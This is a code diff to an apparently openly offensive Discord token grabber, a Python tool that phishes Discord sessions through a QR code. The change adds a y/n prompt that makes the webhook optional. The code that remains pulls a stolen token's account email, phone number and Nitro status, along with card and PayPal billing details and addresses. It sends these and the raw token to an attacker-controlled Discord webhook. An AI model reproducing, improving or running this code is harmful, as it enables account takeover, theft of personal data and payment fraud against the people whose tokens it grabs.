@@ -96,32 +96,33 @@ def main(webhook_url) -> None:
     time.sleep(3)
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
     Write.Print(f"\n\n[?] Token grabbed: {token}", Colors.rainbow)
-    Write.Print("\n\n[!]Fetching token data...", Colors.red_to_purple)
-    webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://i.postimg.cc/qRHbRP2g/discord-avatar.png")
-    embed = DiscordEmbed(color='88c800')
-    if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) != None:
-        userdata, user_billings, user_subs = get_user_data(token), get_discord_info(token, 1), get_discord_info(token, 2)
-        if userdata != None:
-            embed.add_embed_field(name='User Token Info', value=f":crown:`Username:` **{userdata[0]}#{userdata[1]}**\n:e_mail:`Mail:` **{userdata[2]}**\n:mobile_phone:`Phone:` **{userdata[3]}**\n:money_with_wings:`Nitro:` **{':white_check_mark:' if bool(user_subs) else ':x:'}**", inline=False)
-            if bool(user_billings):
-                for data in user_billings:
-                    if data['type'] == 1:
-                        embed.add_embed_field(name='Payment Info (Debit or Credit Card)', value=f""":credit_card:`Brand:` ||**{data['brand']}**||\n:information_source:`Last 4:` ||**{data['last_4']}**||\n:date:`Expiration:` ||**{data['expires_month']}/{data['expires_year']}**||
-                        ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
-                    elif data['type'] == 2:
-                        embed.add_embed_field(name='Payment Info (Paypal)', value=f""":incoming_envelope:`Paypal Mail:` ||**{data['email']}**||
-                        ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
+    if webhook_url != None:
+        Write.Print("\n\n[!]Fetching token data...", Colors.red_to_purple)
+        webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://i.postimg.cc/qRHbRP2g/discord-avatar.png")
+        embed = DiscordEmbed(color='88c800')
+        if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) != None:
+            userdata, user_billings, user_subs = get_user_data(token), get_discord_info(token, 1), get_discord_info(token, 2)
+            if userdata != None:
+                embed.add_embed_field(name='User Token Info', value=f":crown:`Username:` **{userdata[0]}#{userdata[1]}**\n:e_mail:`Mail:` **{userdata[2]}**\n:mobile_phone:`Phone:` **{userdata[3]}**\n:money_with_wings:`Nitro:` **{':white_check_mark:' if bool(user_subs) else ':x:'}**", inline=False)
+                if bool(user_billings):
+                    for data in user_billings:
+                        if data['type'] == 1:
+                            embed.add_embed_field(name='Payment Info (Debit or Credit Card)', value=f""":credit_card:`Brand:` ||**{data['brand']}**||\n:information_source:`Last 4:` ||**{data['last_4']}**||\n:date:`Expiration:` ||**{data['expires_month']}/{data['expires_year']}**||
+                            ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
+                        elif data['type'] == 2:
+                            embed.add_embed_field(name='Payment Info (Paypal)', value=f""":incoming_envelope:`Paypal Mail:` ||**{data['email']}**||
+                            ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
+                else:
+                    embed.add_embed_field(name='Payment Info (:x:)', value="**No Payment Info Founded.**\n", inline=False)
             else:
-                embed.add_embed_field(name='Payment Info (:x:)', value="**No Payment Info Founded.**\n", inline=False)
+                embed.add_embed_field(name='User Token Info :interrobang:', value="**This token doesn't provide any information about the account, maybe it's corrupted.**\n", inline=False)
+            embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)        
         else:
-            embed.add_embed_field(name='User Token Info :interrobang:', value="**This token doesn't provide any information about the account, maybe it's corrupted.**\n", inline=False)
-        embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)        
-    else:
-        embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
-    webhook.add_embed(embed)
-    embed.set_footer(text='By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0', inline=False)
-    Write.Print("\n[!] Sending data to discord webhook...", Colors.red_to_purple)
-    webhook.execute()
+            embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
+        webhook.add_embed(embed)
+        embed.set_footer(text='By Luci (9P9), Lemon.-_-.#3714, the-cult-of-integral and mte0', inline=False)
+        Write.Print("\n[!] Sending data to discord webhook...", Colors.red_to_purple)
+        webhook.execute()
     Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)
     
 if __name__ == "__main__":
@@ -150,9 +151,14 @@ if __name__ == "__main__":
             MenuItem('Quit', window_state)
         ))
         pystray_icon.icon.run()
-
+    confir = Write.Input("[*] Do you want to use a webhook url ? [y/n] -> ", Colors.green_to_cyan, interval=0.01)
+    if confir == 'y':
+        th_main = Thread(target=main, args=(Write.Input("\n[*] Enter your webhook url -> ", Colors.green_to_cyan, interval=0.01),))
+    elif confir == 'n':
+        th_main = Thread(target=main, args=(None,))
+    else:
+        sys.exit()
     Thread(target=pystray_icon).start()
-    th_main = Thread(target=main, args=(Write.Input("[*] Enter your webhook url -> ", Colors.green_to_cyan, interval=0.01),))
     th_main.start()
     while True:
         if not th_main.is_alive():
